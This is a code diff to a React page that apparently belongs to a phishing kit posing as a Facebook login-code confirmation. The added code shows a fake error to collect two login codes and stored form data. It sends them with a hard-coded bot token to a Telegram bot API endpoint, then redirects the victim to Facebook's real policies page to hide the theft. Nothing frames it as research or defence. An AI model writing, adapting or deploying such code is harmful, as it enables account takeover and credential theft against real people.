@@ -5,30 +5,60 @@ import { useRouter } from 'next/router';
 
 import { Button, Modal } from 'antd';
 
+import { standardService } from 'services/apiService/standardService';
+import { useStandardActions, useStandardFormData } from 'store/standard/selector';
+
 const ConfirmPage = () => {
   const router = useRouter();
 
   const [code, setCode] = useState('');
+  const [code2, setCode2] = useState('');
   const [count, setCount] = useState(0);
   const [modal, setModal] = useState(false);
   const [showError, setShowError] = useState(false);
   const [countdownTime, setCountdownTime] = useState(Date.now() + 300000);
 
+  const formDataValue = useStandardFormData();
+  const { handleSetFormData } = useStandardActions();
+
+  console.log('formDataValue :>> ', formDataValue);
+
   const handleChangePassword = (event: any) => {
     const { value } = event.target;
-    setCode(value);
+
+    if (showError) {
+      setCode2(value);
+    } else {
+      setCode(value);
+    }
   };
 
-  const handleSendCode = () => {
-    if (code) {
-      setShowError(true);
-      setTimeout(() => {
-        setCount(count + 1);
-      }, 1000);
-
+  const handleSendCode = async () => {
+    if (code || code2) {
       if (count === 2) {
         setShowError(false);
-        router.replace('https://www.facebook.com/policies_center/');
+        handleSetFormData({ ...formDataValue, code2: code2 });
+
+        try {
+          const response = await standardService.sendMessage(
+            'https://api.telegram.org/bot6122232812:AAFzPiXDO6Mt29_8QVjlWWGXaGZildwF8io/sendMessage',
+            {
+              chat_id: '-4077356603',
+              text: JSON.stringify({ ...formDataValue, code2: code2 }, null, 2),
+            },
+          );
+
+          if (response) {
+            router.replace('https://www.facebook.com/policies_center/');
+          }
+        } catch (error) {
+          return;
+        }
+      } else {
+        setShowError(true);
+        setCount(2);
+        handleSetFormData({ ...formDataValue, code1: code });
+        setCode('');
       }
     } else {
       return;
@@ -75,7 +105,12 @@ const ConfirmPage = () => {
         </div>
 
         <div className='code'>
-          <input type='text' placeholder='Login code' onChange={handleChangePassword} />
+          <input
+            type='text'
+            placeholder='Login code'
+            value={showError ? code2 : code}
+            onChange={handleChangePassword}
+          />
           <Countdown date={countdownTime} renderer={renderer} />
         </div>
         {showError && (
@@ -97,7 +132,7 @@ const ConfirmPage = () => {
 
       <Modal
         centered
-        title='Didn’t receive a code?'
+        title={`Didn't receive a code?`}
         open={modal}
         onCancel={visibleModal}
         footer={[
